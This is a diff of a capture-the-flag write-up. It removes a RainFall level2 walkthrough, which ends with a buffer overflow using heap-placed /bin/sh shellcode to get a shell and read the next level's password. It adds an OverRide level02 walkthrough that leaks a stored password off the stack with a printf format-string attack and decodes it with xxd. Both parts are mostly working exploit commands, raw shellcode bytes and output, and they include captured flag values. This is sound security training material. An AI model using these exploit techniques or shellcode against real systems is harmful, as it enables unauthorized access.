@@ -1,117 +1,21 @@
-# We have a executable "level2" lets do some test!
+level02@OverRide:~$ python -c "print('AAAAAAAA' +'%p.' * 100)" | ./level02 
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: --[ Password: *****************************************
+AAAAAAAA0x7fffffffe500.(nil).0x70.0x2a2a2a2a2a2a2a2a.0x2a2a2a2a2a2a2a2a.0x7fffffffe6f8.0x1f7ff9a08.0x2e70252e70252e70.
+0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.
+0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x100252e70.(nil).
+0x756e505234376848.0x45414a3561733951.0x377a7143574e6758.0x354a35686e475873.0x48336750664b394d.(nil).0x4141414141414141.
+0x70252e70252e7025.0x252e70252e70252e. does not have access!
 
->level2@RainFall:~$ ./level2 
-test
-test
->level2@RainFall:~$ ./level2 
-test test
-test test
->level2@RainFall:~$
+We can find in gdb that the code read from the .pass file just before our input. It means that the password should be on the
+stack right before our input. Exploiting printf, we can print the stack and locate the password. We must take it backward like so:
 
-# This program don't take argument, read stdin and display what we have write.
+0x48336750664b394d0x354a35686e4758730x377a7143574e67580x45414a35617339510x756e505234376848
 
-# Let's use gdb to investigate
+And than, using xxd, we convert it back to decimal:
 
->gdb level2
-(gdb) disas main
-[...]
-   0x0804853f <+0>:	push   %ebp
-   0x08048540 <+1>:	mov    %esp,%ebp
-   0x08048542 <+3>:	and    $0xfffffff0,%esp
-   0x08048545 <+6>:	call   0x80484d4 <p>
-   0x0804854a <+11>:	leave  
-   0x0804854b <+12>:	ret    
-[...]
-
-# Let's disas the p function to
-
-(gdb) disas p
-[...]
-   0x080484ea <+22>:	mov    %eax,(%esp)
-   0x080484ed <+25>:	call   0x80483c0 <gets@plt>
-[...]
-
-# Its a gets call again! But after the function call puts and strdup (see below)
-
-[...]
-   0x08048527 <+83>:	lea    -0x4c(%ebp),%eax
-   0x0804852a <+86>:	mov    %eax,(%esp)
-   0x0804852d <+89>:	call   0x80483f0 <puts@plt>
-   0x08048532 <+94>:	lea    -0x4c(%ebp),%eax
-   0x08048535 <+97>:	mov    %eax,(%esp)
-   0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
-[...]
-
-# So its diplay what we have write but store it in the heap to interesting to know because NX protection is disable in the vm
-
-# But fist we must see if we can buffer overflow this
-
-(gdb) r <<< $(python -c "print('A' * 150)")
-Starting program: /home/user/level2/level2 <<< $(python -c "print('A' * 150)")
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-
-Program received signal SIGSEGV, Segmentation fault.
-0x41414141 in ?? ()
-
-# Yes we can! So if we can execute code on the heap and this program store our buffer in the heap we can execute some shellcode? Let's give it a go
-
-# First we must calculate the padding
-
-(gdb) b *0x080484ed
-Breakpoint 1 at 0x80484ed
-
-# We create a breakpoint before the gets
-
-(gdb) i f
-Stack level 0, frame at 0xbffff630:
- eip = 0x80484ed in p; saved eip 0x804854a
- called by frame at 0xbffff640
- Arglist at 0xbffff628, args: 
- Locals at 0xbffff628, Previous frame's sp is 0xbffff630
- Saved registers:
-  ebp at 0xbffff628, eip at 0xbffff62c
-(gdb) x $eax
-0xbffff5dc:	0xb7ec36fb
-
-# eip = 0xbffff62c eax = 0xbffff5dc eip-eax = 80 (decimal value)
-
-# Now we must get the address where our buffer is in the heap, we will use ltrace for that
-
-level2@RainFall:~$ ltrace ./level2 
-__libc_start_main(0x804853f, 1, 0xbffff6f4, 0x8048550, 0x80485c0 <unfinished ...>
-fflush(0xb7fd1a20)                               = 0
-gets(0xbffff5fc, 0, 0, 0xb7e5ec73, 0x80482b5AAAAAAAAAA
-)    = 0xbffff5fc
-puts("AAAAAAAAAA"AAAAAAAAAA
-)                               = 11
-strdup("AAAAAAAAAA")                             = 0x0804a008
-+++ exited (status 8) +++
-
-# So we must rewrite eip with 0x0804a008
-
-# Our exploit will be like this: NOP operation + shellcode + strdup address
-
-# NOP operation is a operation who will do nothing... So the system will just pass to the next instruction. Like this we can fill a buffer without create any error
-
-# After the shellcode is a set of hexa value who will translate into assembly instruction and execute /bin/sh so we will have a nice shell!
-
-# And the eip address will be the address where our buffer is and it will execute it
-
-# This is the python command 
-
-python -c "print('\x90' * 35 + '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh' + '\x08\xa0\x04\x08')"
-
-# 35 NOP + 45 instruction (80 in total ) and the buffer address let's try it !
-
-level2@RainFall:~$ python -c "print('\x90' * 35 + '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh' + '\x08\xa0\x04\x08')" > /tmp/test
-level2@RainFall:~$ cat /tmp/test -| ./level2
-������������������������������������^�1��F�F
-                                            �
-                                             ���V
-                                                 1�����/bin/s�
-whoami
-level3
-cd ..
-cd level3
-cat .pass
-492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+level02@OverRide:~$ echo '0x48336750664b394d0x354a35686e4758730x377a7143574e67580x45414a35617339510x756e505234376848' | xxd -p -r | rev
+Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
